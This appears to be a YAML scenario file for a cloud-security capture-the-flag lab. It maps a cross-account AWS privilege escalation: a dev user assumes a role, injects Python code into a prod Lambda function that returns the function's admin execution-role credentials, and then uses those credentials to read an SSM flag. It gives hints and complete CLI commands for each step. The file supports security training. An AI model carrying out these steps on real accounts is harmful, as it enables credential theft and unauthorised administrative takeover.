attackMap:
  nodes:
    - id: starting-principal
      label: "Dev Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{dev_account_id}:user/pl-pathfinding-starting-user-dev"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user in the dev account has permission to assume the
        pl-dev-lambda-invoke-role, which holds cross-account Lambda permissions
        targeting the prod account.

    - id: dev-lambda-invoke-role
      label: "Dev Lambda Invoke Role"
      type: principal
      subType: iam-role
      arn: "arn:aws:iam::{dev_account_id}:role/pl-dev-lambda-invoke-role"
      description: >
        This IAM role in the dev account has lambda:UpdateFunctionCode and
        lambda:InvokeFunction permissions scoped to Lambda functions in the prod account.
        By updating the prod Lambda function's code, you can inject malicious code that
        extracts the Lambda execution role's temporary credentials when invoked.

    - id: prod-lambda
      label: "Prod Lambda Function"
      type: resource
      subType: lambda-function
      arn: "arn:aws:lambda:{region}:{prod_account_id}:function:pl-prod-hello-world"
      description: >
        This Lambda function in the prod account is vulnerable to cross-account code
        injection. Its resource policy allows the dev account to update and invoke it.
        When executed, the injected malicious code returns the Lambda execution role's
        temporary credentials from the runtime environment.

    - id: target-role
      label: "Prod Lambda Execution Role"
      type: principal
      subType: iam-role
      isAdmin: true
      arn: "arn:aws:iam::{prod_account_id}:role/pl-prod-lambda-execution-role"
      description: >
        This Lambda execution role in the prod account has AdministratorAccess attached.
        By extracting its temporary credentials from the Lambda runtime environment, you
        gain full administrative access to the prod AWS account. Use those credentials
        to read the scenario's CTF flag from SSM Parameter Store.

    - id: ctf-flag
      label: "CTF Flag"
      type: resource
      subType: ssm-parameter
      isTarget: true
      arn: "arn:aws:ssm:{region}:{prod_account_id}:parameter/pathfinding-labs/flags/lambda-invoke-update-to-admin"
      description: >
        The CTF flag for this scenario, stored as an SSM parameter in the prod account.
        Retrieving it requires administrative permissions (ssm:GetParameter is granted
        by AdministratorAccess on the Lambda execution role). Your goal is to read this
        parameter using the admin credentials extracted from the Lambda runtime.

  edges:
    - from: starting-principal
      to: dev-lambda-invoke-role
      label: "sts:AssumeRole"
      description: >
        The dev starting user assumes the pl-dev-lambda-invoke-role using STS AssumeRole,
        obtaining temporary credentials with cross-account Lambda permissions.
      hints:
        - "Start by confirming your identity with sts:GetCallerIdentity and listing what IAM roles exist in the dev account."
        - "Look for roles whose names suggest Lambda or deployment permissions -- check their trust policies to see which principals can assume them."
        - "Use iam:GetRole and iam:ListRolePolicies to inspect the role's trust policy and attached permissions before assuming it."
        - "Assume the dev Lambda invoke role with sts:AssumeRole to get temporary credentials that carry cross-account Lambda permissions."
        - "After assuming the role, export the returned AccessKeyId, SecretAccessKey, and SessionToken as environment variables before proceeding."
      commands:
        - description: "Assume the dev Lambda invoke role"
          command: |
            aws sts assume-role \
              --role-arn arn:aws:iam::DEV_ACCOUNT:role/pl-dev-lambda-invoke-role \
              --role-session-name attack-session \
              --output json

    - from: dev-lambda-invoke-role
      to: prod-lambda
      label: "lambda:UpdateFunctionCode"
      description: >
        The dev role updates the prod Lambda function's code with a malicious Python
        payload that extracts the execution role's temporary credentials from the
        Lambda runtime environment when invoked.
      hints:
        - "You now hold cross-account Lambda permissions. Use lambda:ListFunctions to discover what functions exist in the prod account."
        - "Use lambda:GetFunction to inspect the target function's configuration -- pay attention to its Role field, which tells you what execution role it runs as."
        - "Lambda functions have access to their execution role's temporary credentials via the AWS SDK at runtime. A function that returns those credentials gives you the role."
        - "Craft a minimal Python handler that calls boto3.Session().get_credentials() and returns the result, then package it as a zip file."
        - "Upload your payload using lambda:UpdateFunctionCode targeting the prod function's full ARN. Wait a few seconds for the update to finish before invoking."
        - "Browse to https://pathfinding.cloud/paths/lambda-invoke-update for technique details on cross-account Lambda code injection."
      commands:
        - description: "Create malicious Lambda payload"
          command: |
            cat > /tmp/lambda_function.py << 'EOF'
            import boto3, json
            def lambda_handler(event, context):
                session = boto3.Session()
                credentials = session.get_credentials()
                cred_data = {
                    'access_key_id': credentials.access_key,
                    'secret_access_key': credentials.secret_key,
                    'session_token': credentials.token,
                }
                return {'statusCode': 200, 'body': json.dumps(cred_data)}
            EOF
            cd /tmp && zip malicious_lambda.zip lambda_function.py
        - description: "Update the prod Lambda function code"
          command: |
            aws lambda update-function-code \
              --function-name pl-prod-hello-world \
              --zip-file fileb:///tmp/malicious_lambda.zip \
              --region us-west-2

    - from: dev-lambda-invoke-role
      to: prod-lambda
      label: "lambda:InvokeFunction"
      description: >
        The dev role invokes the now-malicious prod Lambda function, which executes
        in the context of the prod Lambda execution role and returns its temporary
        credentials in the response payload.
      hints:
        - "After updating the function code, invoke it using lambda:InvokeFunction with an empty payload."
        - "The response body will be a JSON string -- parse it to extract the access key, secret key, and session token."
        - "Export the extracted credentials as AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, and AWS_SESSION_TOKEN to operate as the prod Lambda execution role."
      commands:
        - description: "Invoke the malicious Lambda function to extract credentials"
          command: |
            aws lambda invoke \
              --function-name pl-prod-hello-world \
              --region us-west-2 \
              --payload '{}' \
              /tmp/response.json && cat /tmp/response.json | jq -r '.body | fromjson'

    - from: prod-lambda
      to: target-role
      label: "credential extraction"
      description: >
        The malicious Lambda function reads its execution role's temporary credentials
        from the runtime environment (available to all Lambda functions via the AWS SDK)
        and returns them in the function response, giving the attacker full administrative
        access to the prod account.
      hints:
        - "The JSON response from invoking the Lambda function contains the execution role's temporary credentials -- extract all three fields: access key, secret key, and session token."
        - "Export the credentials and confirm your new identity with sts:GetCallerIdentity to verify you are now the prod Lambda execution role."
        - "Test admin access by calling iam:ListUsers or another privileged action -- the execution role has AdministratorAccess."
      commands:
        - description: "Verify admin access using extracted credentials"
          command: |
            export AWS_ACCESS_KEY_ID=<extracted_access_key_id>
            export AWS_SECRET_ACCESS_KEY=<extracted_secret_access_key>
            export AWS_SESSION_TOKEN=<extracted_session_token>
            aws sts get-caller-identity
        - description: "Confirm full administrative access"
          command: |
            aws iam list-users --max-items 5

    - from: target-role
      to: ctf-flag
      label: "ssm:GetParameter"
      description: >
        With the prod Lambda execution role's temporary credentials in hand, retrieve
        the scenario's CTF flag from SSM Parameter Store. AdministratorAccess grants
        ssm:GetParameter on all parameters in the account, so no additional permissions
        are needed beyond the admin credentials extracted from the Lambda runtime.
      hints:
        - "You now hold admin credentials for the prod account. The scenario flag is stored in an AWS service commonly used to hold configuration values and small secrets."
        - "Scenario flags live under a shared prefix in SSM Parameter Store -- consider what a reasonable naming convention for this lab might look like."
        - "Use ssm:GetParameter with the full parameter name to retrieve the flag value."
      commands:
        - description: "Retrieve the CTF flag from SSM Parameter Store"
          command: "aws ssm get-parameter --name /pathfinding-labs/flags/lambda-invoke-update-to-admin --query 'Parameter.Value' --output text"
